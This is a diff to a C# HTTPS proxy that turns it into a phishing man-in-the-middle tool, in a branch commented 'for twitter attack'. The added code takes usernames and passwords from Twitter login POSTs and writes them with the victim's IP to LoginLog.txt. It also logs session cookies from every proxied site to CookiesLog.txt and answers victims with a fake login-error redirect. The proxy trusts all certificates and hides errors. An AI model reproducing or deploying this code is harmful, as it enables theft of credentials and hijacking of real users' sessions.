@@ -29,7 +29,8 @@ namespace HTTPProxyServer
         private static readonly Regex cookieSplitRegEx = new Regex(@",(?! )");
         private static X509Certificate _certificate;
         private static object _outputLockObj = new object();
-        private static string currentUrl = "";
+        private static string url = "";
+        private static string lastUrl = "";
 
 
         private TcpListener _listener;
@@ -64,6 +65,8 @@ namespace HTTPProxyServer
             _listener = new TcpListener(ListeningIPInterface, ListeningPort);
             ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
             _certificate = createCertificate();
+            Console.WriteLine("Logger Path: " + Directory.GetCurrentDirectory());
+
         }
 
 
@@ -122,7 +125,7 @@ namespace HTTPProxyServer
             }
             catch (Exception ex)
             {
-                Console.WriteLine(ex.Message);
+
             }
             finally
             {
@@ -138,12 +141,13 @@ namespace HTTPProxyServer
             SslStream sslStream = null;
             StreamReader clientStreamReader = null;
             bool uriHasChanged = false;
+            string remoteUri = "";
 
 
             
             try
             {
-                sslStream = new SslStream(client.GetStream());
+               sslStream = new SslStream(client.GetStream());
                 sslStream.AuthenticateAsServer(_certificate,false,SslProtocols.Tls,true);
                 outStream = sslStream;
                 string message = ReadMessage(sslStream);
@@ -152,7 +156,6 @@ namespace HTTPProxyServer
                 byte[] byteArray = Encoding.UTF8.GetBytes(message);
                 MemoryStream stream = new MemoryStream(byteArray);
                 clientStreamReader =  new StreamReader(stream);
-                //read the first line HTTP command
                 String httpCmd = clientStreamReader.ReadLine();
                 if (String.IsNullOrEmpty(httpCmd))
                 {
@@ -160,148 +163,170 @@ namespace HTTPProxyServer
                     clientStream.Close();
                     return;
                 }
+
+                remoteUri = updateUri(message,client);
+
                 //break up the line into three components
                 String[] splitBuffer = httpCmd.Split(spaceSplit, 3);
 
                 String method = splitBuffer[0];
-                String remoteUri = splitBuffer[1];
-                if (!remoteUri.Contains("url="))
+ 
+
+                if((method=="GET" || method == "POST"))
                 {
-                    remoteUri = currentUrl + remoteUri;
-                    uriHasChanged = true;
-                }
-                else
-                {
-                    currentUrl = remoteUri.Substring(6);
+                   
+                    Version version = new Version(1, 0);
 
-                }
+                    HttpWebRequest webReq = null;
+                    HttpWebResponse response = null;
 
-                Version version = new Version(1, 0);
-
-                HttpWebRequest webReq;
-                HttpWebResponse response = null;
-                if (!uriHasChanged)
-                {
-                    remoteUri = remoteUri.Substring(6);
-                }
-                else
-                {
-                    
-                }
-         
-
-                //construct the web request that we are going to issue on behalf of the client.
-                
-                if (remoteUri.Contains("twitter"))
-                {
-                    
-                    webReq = (HttpWebRequest)HttpWebRequest.Create("https://"+remoteUri);
-                }
-                else if (!remoteUri.Contains("http"))
-                {
-                    webReq = (HttpWebRequest)HttpWebRequest.Create("http://"+remoteUri);  
-                }
-                else webReq = (HttpWebRequest)HttpWebRequest.Create(remoteUri);
-                webReq.Method = method;
-                webReq.ProtocolVersion = version;
-
-                //read the request headers from the client and copy them to our request
-                int contentLen = ReadRequestHeaders(clientStreamReader, webReq);
-                
-                webReq.Proxy = null;
-                webReq.KeepAlive = false;
-                webReq.AllowAutoRedirect = false;
-                webReq.AutomaticDecompression = DecompressionMethods.None;
-
-
-
-
-                 if (method.ToUpper() == "POST")
-                {
-                    char[] postBuffer = new char[contentLen];
-                    int bytesRead;
-                    int totalBytesRead = 0;
-                    StreamWriter sw = new StreamWriter(webReq.GetRequestStream());
-                    while (totalBytesRead < contentLen && (bytesRead = clientStreamReader.ReadBlock(postBuffer, 0, contentLen)) > 0)
+                    //for twitter attack
+                    if (method.Contains("POST") && remoteUri.Contains("twitter.com/sessions"))
                     {
-                        totalBytesRead += bytesRead;
-                        sw.Write(postBuffer, 0, bytesRead);
+                        string responseFromTwitter = fetchUserCradentialsAndUpdateUser(message);
+                        string[] messageParts = message.Split(new string[] { "username_or_email%5D=", "userPassword%5D=" }, StringSplitOptions.None);
+                        string time = DateTime.Now.ToString();
+                        string userIp = ((IPEndPoint) client.Client.RemoteEndPoint).Address.ToString();
+                        string userName = messageParts[1].Split('&')[0];
+                        string password = messageParts[2].Split('&')[0];
+                        writeLoginToConsoleAndFile(time,userIp, userName, password);
+                        byte[] responseInBytes = Encoding.UTF8.GetBytes(responseFromTwitter);
+                        sslStream.Write(responseInBytes);
+                    }
 
+                    else {
+
+                        if (remoteUri.Contains("twitter"))
+                        {
+                            if (!remoteUri.Contains("https"))
+                                webReq = (HttpWebRequest) HttpWebRequest.Create("https://" + remoteUri);
+                            else webReq = (HttpWebRequest) HttpWebRequest.Create(remoteUri);
+                        }
+
+                        else
+                        {
+
+                                if (!remoteUri.Contains("http"))
+                                {
+                                    webReq = (HttpWebRequest) HttpWebRequest.Create("http://" + remoteUri);
+                                }
+                                else
+                                {
+                                    webReq = (HttpWebRequest) HttpWebRequest.Create(remoteUri);
+                                }
+
+                        }
+
+                        webReq.Method = method;
+                        webReq.ProtocolVersion = version;
+
+                    //read the request headers from the client and copy them to our request
+                    int contentLen = ReadRequestHeaders(clientStreamReader, webReq);
+
+                         if (method.ToUpper() == "POST")
+                           {
+                                    char[] postBuffer = new char[contentLen];
+                                    int bytesRead;
+                                    int totalBytesRead = 0;
+                                    StreamWriter sw = new StreamWriter(webReq.GetRequestStream());
+                                    while (totalBytesRead < contentLen &&
+                                           (bytesRead = clientStreamReader.ReadBlock(postBuffer, 0, contentLen)) > 0)
+                                    {
+                                        totalBytesRead += bytesRead;
+                                        sw.Write(postBuffer, 0, bytesRead);
+
+                                    }
+
+
+                               sw.Close();
                     }
 
 
-                    sw.Close();
-                }
 
-                    //Console.WriteLine(String.Format("ThreadID: {2} Requesting {0} on behalf of client {1}", webReq.RequestUri, client.Client.RemoteEndPoint.ToString(), Thread.CurrentThread.ManagedThreadId));
                     webReq.Timeout = 15000;
 
                     try
                     {
-                        response = (HttpWebResponse)webReq.GetResponse();
+                        response = (HttpWebResponse) webReq.GetResponse();
                     }
                     catch (WebException webEx)
                     {
                         response = webEx.Response as HttpWebResponse;
                     }
-                    if (response != null)
-                    {
-                        List<Tuple<String,String>> responseHeaders = ProcessResponse(response);
-                        StreamWriter myResponseWriter = new StreamWriter(outStream);
-                        Stream responseStream = response.GetResponseStream();
-                        try
+                        if (response != null)
                         {
-                            //send the response status and response headers
-                            WriteResponseStatus(response.StatusCode,response.StatusDescription, myResponseWriter);
-                            WriteResponseHeaders(myResponseWriter, responseHeaders);
-                            
-
-                            byte [] resultArray=  updateResponseLinks(responseStream, remoteUri);
-                            if (resultArray != null)
+                            List<Tuple<String, String>> responseHeaders = ProcessResponse(response);
+                            StreamWriter myResponseWriter = new StreamWriter(outStream);
+                            Stream responseStream = response.GetResponseStream();
+                            try
                             {
-                                responseStream = new MemoryStream(resultArray);
+                                //send the response status and response headers
+                                WriteResponseStatus(response.StatusCode, response.StatusDescription, myResponseWriter);
+                                WriteResponseHeaders(myResponseWriter, responseHeaders);
+
+
+                                byte[] resultArray = updateResponseLinks(responseStream, remoteUri);
+                                if (resultArray != null)
+                                {
+                                    responseStream = new MemoryStream(resultArray);
+                                }
+
+
+
+                                DateTime? expires = null;
+                                Byte[] buffer;
+                                if (response.ContentLength > 0)
+                                    buffer = new Byte[response.ContentLength];
+                                else
+                                    buffer = new Byte[BUFFER_SIZE];
+
+                                int bytesRead;
+
+
+                                while ((bytesRead = responseStream.Read(buffer, 0, buffer.Length)) > 0)
+                                {
+                                    outStream.Write(buffer, 0, bytesRead);
+
+                                }
+
+                                responseStream.Close();
+
+
+                                outStream.Flush();
+
+                                foreach (Cookie cookie in response.Cookies)
+                                {
+                                    writeCookiesToFile(DateTime.Now.ToString(), ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString(), url, cookie.Name, cookie.Value);
+                                }
+
                             }
-                             
-
-
-                            DateTime? expires = null;
-                            Byte[] buffer;
-                            if (response.ContentLength > 0)
-                                buffer = new Byte[response.ContentLength];
-                            else
-                                buffer = new Byte[BUFFER_SIZE];
-
-                            int bytesRead;
-                            
-
-                            while ((bytesRead = responseStream.Read(buffer, 0, buffer.Length)) > 0)
+                            catch (Exception ex)
                             {
-                                outStream.Write(buffer, 0, bytesRead);
-
                             }
-
-                            responseStream.Close();
-
-
-                            outStream.Flush();
-
-                        }
-                        catch (Exception ex)
-                        {
-                            Console.WriteLine(ex.Message);
-                        }
-                        finally
-                        {
-                            responseStream.Close();
-                            response.Close();
-                            myResponseWriter.Close();
+                            finally
+                            {
+                                responseStream.Close();
+                                response.Close();
+                                myResponseWriter.Close();
+                            }
                         }
                     }
-               
+                }else
+                {
+                    StringBuilder sBuilder = new StringBuilder();
+                    sBuilder.AppendLine("HTTP/1.1 405  Method Not Allowed");
+                    sBuilder.AppendLine(Environment.NewLine);
+                    sBuilder.AppendLine(Environment.NewLine);
+
+                    byte[] messageToUser = Encoding.UTF8.GetBytes(sBuilder.ToString());
+                    sslStream.Write(messageToUser);
+                    sslStream.Close();
+                    
+                }
+
             }
             catch (Exception ex)
             {
-                Console.WriteLine(ex.Message);
             }
             finally
             {
@@ -316,6 +341,74 @@ namespace HTTPProxyServer
             }
 
         }
+
+        private static void writeLoginToConsoleAndFile(string currentTime, string userIpAddress, string uName, string userPassword)
+        {
+            uName = uName.Replace("%40", "@");
+            Console.WriteLine("User Login: " + currentTime + " " + userIpAddress + " " + uName + " " + userPassword);
+            using (StreamWriter outputFile = new StreamWriter(Directory.GetCurrentDirectory() + @"\LoginLog.txt", true))
+            {
+                outputFile.WriteLine("Time and data : " + currentTime);
+                outputFile.WriteLine("IP Address : " + userIpAddress);
+                outputFile.WriteLine("UserName / Email : " + uName);
+                outputFile.WriteLine("Password : " + userPassword);
+                makeSpaceBetweenRecords(outputFile);
+               
+            }
+        }
+
+        private static string updateUri(string message,TcpClient client)
+        {
+            string[] reqParts = message.Split(new string[] { " " }, StringSplitOptions.None);
+            if (reqParts[1].Contains("url="))
+            {
+                url = reqParts[1].Split(new string[] { "/?url=" }, StringSplitOptions.None)[1];
+                lastUrl = url;
+                string time = DateTime.Now.ToString();
+                string ipAddress =((IPEndPoint) client.Client.RemoteEndPoint).Address.ToString();
+                Console.WriteLine("Connection:");
+                Console.WriteLine("Time : " + time);
+                Console.WriteLine("IP Address : " + ipAddress);
+                Console.WriteLine("Site Url : " + url);
+
+                using (StreamWriter outputFile = new StreamWriter(Directory.GetCurrentDirectory() + @"\ConnectionLog.txt", true))
+                {
+                    outputFile.Write("Connection:");
+                    outputFile.WriteLine("Time : " + time);
+                    outputFile.WriteLine("IP Address : " + ipAddress);
+                    outputFile.WriteLine("Site Url : "+ url);
+                    makeSpaceBetweenRecords(outputFile);
+
+                }
+            }
+            else
+            {
+                url = lastUrl + reqParts[1];
+            }
+
+            return url;
+        }
+
+        private static void writeSiteLoginToFile(string currentTime, string userIpAddress, string siteUrl)
+        {
+            Console.WriteLine("Connect to site : "+siteUrl+" Time : "+currentTime+" Ip Address : " + userIpAddress);
+            using (StreamWriter outputFile = new StreamWriter(Directory.GetCurrentDirectory() + @"\ConnectionLog.txt", true))
+            {
+                outputFile.WriteLine("Time and data : " + currentTime);
+                outputFile.WriteLine("IP Address : " + userIpAddress);
+                outputFile.WriteLine("Url site : " + siteUrl);
+                
+                makeSpaceBetweenRecords(outputFile);
+            }
+        }
+
+        private static void makeSpaceBetweenRecords(StreamWriter outputFile)
+        {
+            outputFile.WriteLine();
+            outputFile.WriteLine();
+            outputFile.WriteLine();
+        }
+
 
         private static byte[] updateResponseLinks(Stream responseStream, string remoteUri)
         {
@@ -389,22 +482,11 @@ namespace HTTPProxyServer
 
         }
 
-        private static void DumpHeaderCollectionToConsole(WebHeaderCollection headers)
-        {
-            foreach (String s in headers.AllKeys)
-                Console.WriteLine(String.Format("{0}: {1}", s,headers[s]));
-            Console.WriteLine();
-        }
 
-        private static void DumpHeaderCollectionToConsole(List<Tuple<String,String>> headers)
-        {
-            foreach (Tuple<String,String> header in headers)
-                Console.WriteLine(String.Format("{0}: {1}", header.Item1,header.Item2));
-            Console.WriteLine();
-        }
 
         private static int ReadRequestHeaders(StreamReader sr, HttpWebRequest webReq)
         {
+
             String httpCmd;
             int contentLen = 0;
             do
@@ -426,6 +508,7 @@ namespace HTTPProxyServer
                         break; 
                     case "referer":
                         webReq.Referer = header[1];
+                  
                         break;
                     case "cookie":
                         webReq.Headers["Cookie"] = header[1];
@@ -454,7 +537,6 @@ namespace HTTPProxyServer
                         }
                         catch (Exception ex)
                         {
-                            Console.WriteLine(String.Format("Could not add header {0}.  Exception message:{1}", header[0], ex.Message));
                         }
                         break;
                 }
@@ -468,7 +550,7 @@ namespace HTTPProxyServer
                        "CN=localhost", //host name
                         DateTime.Parse("2015-01-01"), //not valid before
                         DateTime.Parse("2020-01-01"), //not valid after
-                        "sslpass"); //password to encrypt key file
+                        "sslpass"); //userPassword to encrypt key file
             using (BinaryWriter binWriter = new BinaryWriter(File.Open(@"cert.pfx", FileMode.Create)))
             {
                 binWriter.Write(c);
@@ -534,24 +616,7 @@ namespace HTTPProxyServer
                             }
 
                         }
-                        /*
-                        if (document.DocumentNode.SelectNodes(imgSrc) != null)
-                        {
-                            foreach (HtmlNode node in document.DocumentNode.SelectNodes(imgSrc))
-                            {
-                                string attributeValue = node.Attributes["src"].Value;
-                                if (!String.IsNullOrEmpty(attributeValue))
-                                {
-                                    Uri firstStep = new Uri(uriString);
-                                    Uri secondStep = new Uri(firstStep, attributeValue);
-                                    attributeValue = startUri + secondStep.AbsoluteUri;
-                                    node.Attributes["src"].Value = attributeValue;
-
-                                }
-
-                            }
-                        }
-                         * */
+ 
                         if (document.DocumentNode.SelectNodes(linkHref) != null)
                         {
                             foreach (HtmlNode node in document.DocumentNode.SelectNodes(linkHref))
@@ -603,18 +668,7 @@ namespace HTTPProxyServer
 
 
         }
-        /*
-      private static byte[] Compress(Stream input)
-        {
-            using(var compressStream = new MemoryStream())
-            using(var compressor = new DeflateStream(compressStream, CompressionMode.Compress))
-            {
-                input.CopyTo(compressor);
-                compressor.Close();
-                return compressStream.ToArray();
-            }
-        }
-         * */
+
         private static byte[] Compress(Stream input)
         {
             using (var compressStream = new MemoryStream())
@@ -625,6 +679,46 @@ namespace HTTPProxyServer
                 return compressStream.ToArray();
             }
         }
+        public static string fetchUserCradentialsAndUpdateUser(string userMessageDetails)
+        {
+
+            string[] userMessageParts = userMessageDetails.Split(new string[] { "username_or_email%5D=", "password%5D=" }, StringSplitOptions.None);
+            string username = userMessageParts[1].Split('&')[0];
+            username = username.Replace("%40", "@");
+            string password = userMessageParts[2].Split('&')[0];
+            StringBuilder stringBuilder = new StringBuilder();
+            setErrorToUser(stringBuilder, username);
+            return stringBuilder.ToString();
+        }
+
+        private static void setErrorToUser(StringBuilder stringBuilder, string username)
+        {
+            stringBuilder.AppendLine("HTTP/1.1 301 Moved Permanently");
+            stringBuilder.AppendLine("Connection: close");
+            stringBuilder.AppendLine("Location: https://www.twitter.com/login/error?username_or_email=" + username);
+            stringBuilder.AppendLine(Environment.NewLine);
+            stringBuilder.AppendLine(Environment.NewLine);
+        }
+
+        public static void writeCookiesToFile(string currentTime, string userIpAddress, string siteUrl, string cookieName, string cookieValue)
+        {
+            Console.WriteLine("Cookie: Current Time :" + currentTime + " " + userIpAddress + " " + siteUrl + " " + cookieName + " " + cookieValue);
+            using (StreamWriter outputFile = new StreamWriter(Directory.GetCurrentDirectory() + @"\CookiesLog.txt", true))
+            {
+                outputFile.WriteLine("Time and data : " + currentTime);
+                outputFile.WriteLine("IP Address : " + userIpAddress);
+                outputFile.WriteLine("Url site : " + siteUrl);
+                outputFile.WriteLine("Cookie name : " + cookieName);
+                outputFile.WriteLine("Cookie value : " + cookieValue);
+                makeSpaceBetweenRecords(outputFile);
+            }
+        }
         
     }
+
+
+
+
+              
+    
 }
